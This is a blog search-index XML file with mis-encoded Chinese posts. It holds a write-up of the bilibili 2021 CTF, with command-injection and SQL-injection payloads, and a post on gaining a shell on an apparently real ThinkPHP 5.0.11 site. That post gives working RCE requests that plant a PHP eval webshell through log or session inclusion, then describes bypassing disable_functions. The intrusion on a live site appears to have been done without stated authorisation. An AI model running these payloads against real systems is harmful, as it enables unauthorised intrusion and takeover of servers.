<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>bilibili 2021 1024ç¨‹åºå‘˜èŠ‚å®‰å…¨æ”»é˜²æŒ‘æˆ˜èµ›</title>
      <link href="posts/47068.html"/>
      <url>posts/47068.html</url>
      
        <content type="html"><![CDATA[<p>èµ›é¢˜åœ°å€ï¼š<a href="https://www.bilibili.com/blackboard/20211024.html">https://www.bilibili.com/blackboard/20211024.html</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025210203813.png" alt="image-20211025210203813"></p><h1 id="é¢˜ç›®1"><a href="#é¢˜ç›®1" class="headerlink" title="é¢˜ç›®1"></a>é¢˜ç›®1</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025210336274.png" alt="image-20211025210336274"></p><p>AESè§£å¯†ï¼Œå¯†ç ï¼šhappy_1024_2233ï¼Œå¯†æ–‡æ˜¯åº•ä¸‹ä¸¤è¡Œå­—ç¬¦ï¼Œéœ€æ‹¼æˆä¸€è¡Œï¼ˆä¸€å¼€å§‹ç¡®å®æ²¡æƒ³åˆ°æ˜¯è¿™æ ·ï¼ï¼‰</p><p>åœ¨çº¿è§£å¯†ç½‘ç«™ï¼š<a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025210933655.png" alt="image-20211025210933655"></p><h1 id="é¢˜ç›®2"><a href="#é¢˜ç›®2" class="headerlink" title="é¢˜ç›®2"></a>é¢˜ç›®2</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025211100089.png" alt="image-20211025211100089"></p><p>F12ï¼Œä¸€ç•ªå¯»æ‰¾ä¸‹åœ¨home.vueä¸­æ‰¾åˆ°è—ç€çš„flag</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025211529510.png" alt="image-20211025211529510"></p><h1 id="é¢˜ç›®3"><a href="#é¢˜ç›®3" class="headerlink" title="é¢˜ç›®3"></a>é¢˜ç›®3</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025211611168.png" alt="image-20211025211611168"></p><p>ä¸‹è½½å‹ç¼©åŒ…ï¼Œè§£å‹åå¾—åˆ°eval.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">        bilibili- ( ã‚œ- ã‚œ)ã¤ãƒ­ ä¹¾æ¯~</span></span><br><span class="line"><span class="comment">        uat: http://192.168.3.2/uat/eval.php</span></span><br><span class="line"><span class="comment">        pro: http://security.bilibili.com/sec1024/q/pro/eval.php</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="variable">$args</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (count(<span class="variable">$args</span>) &gt;<span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;count(<span class="variable">$args</span>); <span class="variable">$i</span>++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">&#x27;/^\w+$/&#x27;</span>, <span class="variable">$args</span>[<span class="variable">$i</span>]) ) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// <span class="doctag">todo:</span> other filter</span></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&quot;/bin/2233 &quot;</span> . implode(<span class="string">&quot; &quot;</span>, <span class="variable">$args</span>);</span><br><span class="line">    exec(<span class="variable">$cmd</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;count(<span class="variable">$out</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$out</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¤§è‡´æ€è·¯æ˜¯ç”±argså‚æ•°ä¼ å…¥å‘½ä»¤æ¥æ‰¾å‡ºflagï¼Œargsæ•°ç»„å…ƒç´ é™åˆ¶åœ¨3ä¸ªä»¥å†…ï¼Œä¸”æ­£åˆ™åŒ¹é…<code>/^\w+$/</code>è¿‡æ»¤æ‰äº†åƒ<code>/</code>ã€<code>.</code>ã€è¿™æ ·çš„ç‰¹æ®Šå­—ç¬¦ï¼Œargsè¿˜æ‹¼æ¥äº†<code>/bin/2233</code>ï¼Œç›´æ¥ä¼ å…¥å‘½ä»¤æ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œè¿™ä¸ªå¯ä»¥ç”¨ç»“å°¾æ¥æ¢è¡Œç¬¦<code>%0a</code>æ¥ç»•è¿‡ï¼Œç„¶åå°±èƒ½æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><p>ls æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025213016011.png" alt="image-20211025213016011"></p><p>cat passwd å¾—åˆ°flag</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025213132975.png" alt="image-20211025213132975"></p><h1 id="é¢˜ç›®4"><a href="#é¢˜ç›®4" class="headerlink" title="é¢˜ç›®4"></a>é¢˜ç›®4</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025213302057.png" alt="image-20211025213302057"></p><p>åœ°å€å’Œé¢˜ç›®2ä¸€æ ·ï¼Œä¸è¿‡æ²¡å•¥æ€è·¯ã€‚åæ¥å¾—åˆ°æç¤ºæ˜¯sqlæ³¨å…¥ï¼Œå†æ¬¡F12ä¸‹æ‰¾åˆ°ä¸€ä¸ªapiæ¥å£ï¼Œæ˜¯ä»¥POSTæäº¤æ—¥å¿—ä¿¡æ¯çš„ä¸€äº›å‚æ•°ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025214345208.png" alt="image-20211025214345208"></p><p>user_nameå¤„å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ã€‚</p><p>è·å–åº“åï¼Œq</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;user_id&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;user_name&quot;</span>: <span class="string">&quot;1/**/union/**/select/**/1,2,3,4,database()&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;page&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;size&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025215337254.png" alt="image-20211025215337254"></p><p>è·å–è¡¨åï¼Œflag,log,user</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;user_id&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;user_name&quot;</span>: <span class="string">&quot;1/**/union/**/select/**/1,2,3,4,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;page&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;size&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025215534341.png" alt="image-20211025215534341"></p><p>è·å–å­—æ®µåï¼Œidï¼ˆè¿™é‡Œä¸èƒ½ä½¿ç”¨å¼•å·ï¼Œä¸ç„¶å°±æå‰é—­åˆå¯¼è‡´é”™è¯¯ï¼Œå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼Œflagçš„åå…­è¿›åˆ¶ä¸º666c6167ï¼Œå‰é¢åŠ ä¸Š0xï¼‰</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;user_id&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;user_name&quot;</span>: <span class="string">&quot;1/**/union/**/select/**/1,2,3,4,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;page&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;size&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025220140526.png" alt="image-20211025220140526"></p><p>æœ€åä¸€æ­¥ï¼Œè·å–flag</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;user_id&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;user_name&quot;</span>: <span class="string">&quot;1/**/union/**/select/**/1,2,3,4,group_concat(id)/**/from/**/flag&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;page&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;size&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025220407643.png" alt="image-20211025220407643"></p><h1 id="é¢˜ç›®5"><a href="#é¢˜ç›®5" class="headerlink" title="é¢˜ç›®5"></a>é¢˜ç›®5</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025222221427.png" alt="image-20211025222221427"></p><p>ä¸‹è½½test.apkï¼Œè¾“å…¥è´¦æˆ·åå’Œå¯†ç æäº¤åæç¤ºâ€œè¿˜å·®ä¸€ç‚¹ç‚¹~~â€</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025222638203.png" alt="image-20211025222638203"></p><p>é‚£æ˜¯ä¸æ˜¯è¾“å…¥å¯¹äº†å°±ç»™flagï¼Ÿé€æ¸å¿˜è®°é¢˜ç›®ï¼Œè¿™é¢˜è€ƒçš„æ˜¯é€†å‘åˆ†æå•Š~</p><p>ä»¥ä¸‹å‚è€ƒå…¶ä»–å¸ˆå‚…è§£æ³•ï¼š</p><p>JADXæ‰“å¼€</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025223158463.png" alt="image-20211025223158463"></p><p>Encryptæ˜¯åŠ å¯†è¿‡ç¨‹ï¼ŒMainActivityé‡Œçš„ä¸¤ä¸²å­—ç¬¦ï¼Œæ‹¿å»æŒ‰Encrypté‡Œçš„åå‘æ“ä½œä¸€æ¬¡å³å¯ã€‚å³ï¼šä¸€æ¬¡base64è§£ç ï¼Œä¸€æ¬¡å¼‚æˆ–3ï¼Œä¸¤ä¸²å¯åˆæˆä¸€ä¸²flag</p><p>è§£é¢˜è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">obyteArray = [<span class="number">0x59</span>, <span class="number">0x57</span>, <span class="number">0x42</span>, <span class="number">0x6c</span>, <span class="number">0x4f</span>, <span class="number">0x6d</span>, <span class="number">0x5a</span>, <span class="number">0x6e</span>, <span class="number">0x4e</span>, <span class="number">0x6a</span>, <span class="number">0x41</span>, <span class="number">0x75</span>, <span class="number">0x4f</span>, <span class="number">0x6d</span>, <span class="number">0x4a</span>, <span class="number">0x6d</span>, <span class="number">0x4e</span>,</span><br><span class="line">              <span class="number">0x7a</span>,</span><br><span class="line">              <span class="number">0x41</span>, <span class="number">0x78</span>, <span class="number">0x4f</span>, <span class="number">0x32</span>, <span class="number">0x59</span>, <span class="number">0x3d</span>]</span><br><span class="line"> </span><br><span class="line">code = [<span class="number">0x4e</span>, <span class="number">0x6a</span>, <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x4f</span>, <span class="number">0x7a</span>, <span class="number">0x41</span>, <span class="number">0x33</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x75</span>, <span class="number">0x4e</span>, <span class="number">0x6a</span>, <span class="number">0x4e</span>, <span class="number">0x6d</span>, <span class="number">0x4e</span>, <span class="number">0x7a</span>,</span><br><span class="line">        <span class="number">0x63</span>, <span class="number">0x37</span>, <span class="number">0x59</span>, <span class="number">0x6d</span>, <span class="number">0x55</span>, <span class="number">0x3d</span>]</span><br><span class="line"> </span><br><span class="line">user = <span class="string">&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    user+=<span class="built_in">chr</span>(obyteArray[i])</span><br><span class="line">    password+=<span class="built_in">chr</span>(code[i])</span><br><span class="line"> </span><br><span class="line">print(base64.b64decode(user))</span><br><span class="line">print(base64.b64decode(password))</span><br><span class="line"> </span><br><span class="line">a1 = <span class="built_in">str</span>(base64.b64decode(user),encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">a2 = <span class="built_in">str</span>(base64.b64decode(password),encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"> </span><br><span class="line">ans=<span class="string">&quot;&quot;</span></span><br><span class="line">ans1=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    p=<span class="built_in">ord</span>(a1[i1])^<span class="number">3</span></span><br><span class="line">    ans+=<span class="built_in">chr</span>(p)</span><br><span class="line">    p1=<span class="built_in">ord</span>(a2[i1])^<span class="number">3</span></span><br><span class="line">    ans1+=<span class="built_in">chr</span>(p1)</span><br><span class="line"> </span><br><span class="line">print(ans)</span><br><span class="line">print(ans1)</span><br></pre></td></tr></table></figure><h1 id="é¢˜ç›®6"><a href="#é¢˜ç›®6" class="headerlink" title="é¢˜ç›®6"></a>é¢˜ç›®6</h1><p>å¯å‚è€ƒï¼š<a href="https://www.52pojie.cn/thread-1532604-1-1.html">https://www.52pojie.cn/thread-1532604-1-1.html</a></p><h1 id="é¢˜ç›®7"><a href="#é¢˜ç›®7" class="headerlink" title="é¢˜ç›®7"></a>é¢˜ç›®7</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025223534796.png" alt="image-20211025223534796"></p><p>æ—¥å¿—åˆ†æï¼Œéœ€è¦æ‰¾å‡ºæ‰€æœ‰çš„æ¶æ„IPï¼Œéƒ¨åˆ†ç­”æ¡ˆå¦‚ä¸‹ï¼š</p><p>jj.bdc.bbb.cc,dc.bb.ii.jj,cde.ced.bbb.dd,cdd.bcc.bg.bib,cd.bb.cai.cbh,cd.baf.cae.cbc,bfh.ff.dj.jf,bfh.ff.dj.ig,bfh.ff.dj.fb,bfh.ff.dj.bd,bfh.ff.dj.bcf,bbb.bb.bjd.bhf,bbb.bb.bjd.bhc,bbb.bb.bjd.bha,bbb.bb.bjd.bgc,bba.ja.ccb.cbc,bba.ja.cca.beg</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜å†ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡tp5çš„è‰°éš¾getshell</title>
      <link href="posts/18066.html"/>
      <url>posts/18066.html</url>
      
        <content type="html"><![CDATA[<h1 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h1><p>é‡åˆ°ä¸€ä¸ªç«™å¯èƒ½å­˜åœ¨thinkphpçš„rceï¼Œé‚è¿›ä¸€æ­¥æ£€æµ‹ï¼Œä½†æ­¤è¿‡ç¨‹ä¸­ç¢°åˆ°è¯¸å¤šé™åˆ¶ã€‚é€šè¿‡å„ç§æŠ˜è…¾æœ€ç»ˆè‰°éš¾åœ°æ‹¿ä¸‹ï¼Œåœ¨æ­¤è®°å½•ä¸€æ³¢ã€‚</p><h1 id="å°è¯•"><a href="#å°è¯•" class="headerlink" title="å°è¯•"></a>å°è¯•</h1><p>é¦–å…ˆå¾—åˆ°äº†thinkphpçš„ç‰ˆæœ¬ V5.0.11</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211008234419257.png" alt="image-20211008234419257"></p><p>ç„¶åæœç½—äº†ä¸€äº›é’ˆå¯¹æ­¤ç‰ˆæœ¬çš„expè¿›è¡Œå°è¯•ï¼Œä¸€ç•ªæµ‹è¯•ä¸‹æ¥å‘ç°å¤§éƒ¨åˆ†æ–¹æ³•éƒ½è¡Œä¸é€šï¼Œä¸è¿‡phpinfoå¯ä»¥å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;captcha</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;call_user_func&amp;get[]&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009000447593.png" alt="image-20211009000447593"></p><p>æœç´¢disable_functionsï¼Œæœç„¶æœ‰å¾ˆå¤šå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½è¢«ç¦æ­¢äº†</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009000540033.png" alt="image-20211009000540033"></p><p>çœ‹äº†ä¸€éå‘ç°è¿˜æœ‰ä¸€ä¸ªæ¼ç½‘ä¹‹é±¼<code>assert</code>å‡½æ•°ä¸åœ¨disable_functionä¸­ï¼Œä½†æ¢ç”¨å®ƒå»ç»“åˆcall_user_func()æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶ä»ç„¶å¤±è´¥ã€‚</p><p>åæ¥æŸ¥é˜…èµ„æ–™å¾—çŸ¥ï¼Œåœ¨php7.0ä¹‹åï¼Œ<code>assert()</code>ä½œä¸ºä¸€ç§è¯­è¨€æ„é€ å™¨ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ã€‚</p><p>æ•…ä¸æ»¡è¶³<code>call_user_func</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œæ— æ³•åˆ©ç”¨ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009004047624.png" alt="image-20211009004047624"></p><p>æ³¨æ„ï¼Œ<code>eval()</code>ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ— æ³•ä½œä¸º<code>call_user_func</code>çš„å›è°ƒå‡½æ•°ã€‚</p><p>ä¸‹é¢å°è¯•ä½¿ç”¨<code>file_put_contents</code>æ¥å†™shellï¼Œä½†ä¹Ÿè¡Œä¸é€šã€‚åæ¥åœ¨å…¶ä»–å¸ˆå‚…æ–‡ç« ä¸­å¾—çŸ¥ï¼Œè¿™é‡Œçš„æ¼æ´åˆ©ç”¨ç‚¹åªèƒ½è°ƒç”¨å•å‚æ•°çš„å‡½æ•°ï¼Œè€Œè¿™ä¸ªå†™æ–‡ä»¶çš„å‡½æ•°è‡³å°‘éœ€è¦ä¸¤ä¸ªå‚æ•°ã€‚</p><p><img src="https://www.7ten7.top/images/20200502/003.png" alt="img"></p><h1 id="çªç ´"><a href="#çªç ´" class="headerlink" title="çªç ´"></a>çªç ´</h1><p>æ ¹æ®ç½‘ä¸Šå¸ˆå‚…ä»¬åˆ†äº«çš„æ–‡ç« ï¼Œå¯¹tp5çš„ä»£ç æ‰§è¡Œç°æœ‰ä¸¤ç§æ€è·¯ï¼š</p><ol><li><p>å†™æ—¥å¿—ï¼ŒåŒ…å«æ—¥å¿—getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å†™shellè¿›æ—¥å¿—</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;call_user_func&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;&lt;?php eval($_POST[&#39;x&#39;])?&gt;</span><br><span class="line"></span><br><span class="line">åŒ…å«æ—¥å¿—æ–‡ä»¶</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;..&#x2F;runtime&#x2F;log&#x2F;201901&#x2F;21.log&amp;x&#x3D;phpinfo();</span><br></pre></td></tr></table></figure></li><li><p>å†™sessionï¼ŒåŒ…å«session getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å†™ shell åˆ° session æ–‡ä»¶</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;think\Session::set&amp;method&#x3D;get&amp;get[]&#x3D;&lt;?php eval($_POST[&#39;x&#39;])?&gt;&amp;server[]&#x3D;1</span><br><span class="line"></span><br><span class="line">åŒ…å« session æ–‡ä»¶</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;get[]&#x3D;&#x2F;tmp&#x2F;sess_[sessid]&amp;server[]&#x3D;1</span><br></pre></td></tr></table></figure><p>å†™æ—¥å¿—ï¼Œå‰ææ˜¯éœ€è¦ç›®æ ‡å¼€å¯äº†æ—¥å¿—åŠŸèƒ½ã€‚</p></li></ol><p>åŒ…å«æ—¥å¿—ï¼Œå‰æéœ€è¦çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ï¼ˆtpä¸‹ä¸€èˆ¬æœ‰è§„å¾‹ï¼‰ã€‚</p><p>è¿™æ¬¡çš„ç›®æ ‡ç¢°å·§å¼€å¯äº†æ—¥å¿—åŠŸèƒ½ï¼Œé‚£ç›´æ¥å†™å…¥ï¼Œå¹¶åŒ…å«æ—¥å¿—æ–‡ä»¶getshell</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009011032571.png" alt="image-20211009011032571"></p><p>èšå‰‘è¿æ¥ï¼Œéœ€è¦æŠŠPOSTæäº¤çš„å‚æ•°å¡«å…¥è¯·æ±‚ä¿¡æ¯Bodyå¤„</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009011608712.png" alt="image-20211009011608712"></p><p>å†™sessionä¹Ÿä¸€æ ·ï¼Œç„¶åç›´æ¥åˆ©ç”¨æ–‡ä»¶åŒ…å«å»åŒ…å«sessionæ–‡ä»¶ï¼Œtp5çš„sessionæ–‡ä»¶ä¸€èˆ¬åœ¨/tmpä¸‹ï¼Œæ–‡ä»¶åä¸ºsess_sessionid</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009014309630.png" alt="image-20211009014309630"></p><p>èšå‰‘æˆåŠŸè¿æ¥</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009012943615.png" alt="image-20211009012943615"></p><h1 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h1><p>å‰é¢è¾›è‹¦æ‹¿ä¸‹æ¥webshellï¼Œä½†å±…ç„¶æ— æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Ÿï¼éƒ½æ˜¯è¿”å›ret=127ğŸ˜…</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009014837549.png" alt="image-20211009014837549"></p><p>ä¹‹åæ‰åçŸ¥åè§‰ï¼Œè¿˜æ˜¯å› ä¸ºdisable_functionsæŠŠæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ç»™ç¦ç”¨äº†ã€‚</p><p>é‚£æ€ä¹ˆæ‰èƒ½ç»•è¿‡è¿™ä¸€é™åˆ¶å‘¢ï¼Ÿå·²ç»æœ‰å¸ˆå‚…å¯¹æ­¤ä½œäº†è¯¦ç»†æ€»ç»“â€”â€”<a href="https://www.freebuf.com/articles/network/263540.html">ç»•è¿‡Disable Functionsæ¥æäº‹æƒ…</a></p><p>åœ¨èšå‰‘ä¸­ä¹Ÿæœ‰ç›¸å…³æ’ä»¶â€œç»•è¿‡disable_functionsâ€</p><p>ä½†å› ä¸ºputenvåœ¨é»‘åå•ä¸­ï¼Œå¯¼è‡´å¾ˆå¤šç»•è¿‡æ–¹æ³•éƒ½æ— æ³•ä½¿ç”¨ï¼Œæœ€ç»ˆåˆ©ç”¨PHP7_Backtrace_UAFæˆåŠŸç»•è¿‡ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009020143149.png" alt="image-20211009020143149"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009020634259.png" alt="image-20211009020634259"></p><p>åˆ°æ­¤ï¼ŒæˆåŠŸgetshell</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><blockquote><p><a href="https://www.7ten7.top/2020/05/02/2020-05-02-%E5%AF%B9%E6%9F%90%E6%90%9C%E7%B4%A2%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E6%AC%A1Getshell/">https://www.7ten7.top/2020/05/02/2020-05-02-%E5%AF%B9%E6%9F%90%E6%90%9C%E7%B4%A2%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E6%AC%A1Getshell/</a></p><p><a href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€åˆæ¢ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UEditor.netç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼ åˆ°getshell</title>
      <link href="posts/53639.html"/>
      <url>posts/53639.html</url>
      
